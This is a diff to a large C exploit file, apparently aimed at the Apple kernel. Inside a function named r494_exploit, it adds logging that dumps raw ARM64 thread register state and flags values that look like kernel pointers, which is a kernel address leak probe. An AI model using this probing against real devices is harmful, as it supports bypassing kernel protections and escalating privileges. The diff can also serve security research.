@@ -25753,7 +25753,7 @@ static void r494_exploit(void) {
             rlog("  PropertyMaximum(BPE)=%zu\n",
                  IOSurfaceGetPropertyMaximum(kIOSurfaceBytesPerElement));
             rlog("  PropertyMaximum(PlaneCount)=%zu\n",
-                 IOSurfaceGetPropertyMaximum(kIOSurfacePlaneCount));
+                 IOSurfaceGetPropertyMaximum(CFSTR("IOSurfacePlaneCount")));
             rlog("  PropertyAlignment(BPR)=%zu\n",
                  IOSurfaceGetPropertyAlignment(kIOSurfaceBytesPerRow));
 
@@ -25825,11 +25825,18 @@ static void r494_exploit(void) {
             mach_msg_type_number_t scnt = ARM_THREAD_STATE64_COUNT;
             kr = thread_get_state(threads[0], ARM_THREAD_STATE64,
                 (thread_state_t)&state, &scnt);
-            rlog("  thread_get_state[0]: kr=%d\n", kr);
+            rlog("  thread_get_state[0]: kr=%d scnt=%u\n", kr, scnt);
             if (kr == KERN_SUCCESS) {
-                rlog("    pc=0x%llx lr=0x%llx sp=0x%llx fp=0x%llx\n",
-                     (uint64_t)state.__pc, (uint64_t)state.__lr,
-                     (uint64_t)state.__sp, (uint64_t)state.__fp);
+                uint64_t *raw = (uint64_t *)&state;
+                rlog("    raw regs:");
+                for (int ri = 0; ri < 8 && ri < (int)(scnt * 4 / 8); ri++)
+                    rlog(" [%d]=0x%llx", ri, (unsigned long long)raw[ri]);
+                rlog("\n");
+                for (int ri = 0; ri < (int)(scnt * 4 / 8); ri++) {
+                    if ((raw[ri] >> 36) == 0xfffffff || (raw[ri] >> 36) == 0xfffffffe)
+                        rlog("  *** KPTR in thread state[%d]: 0x%llx ***\n",
+                             ri, (unsigned long long)raw[ri]);
+                }
             }
             for (mach_msg_type_number_t t = 0; t < tcnt; t++)
                 mach_port_deallocate(self_task, threads[t]);
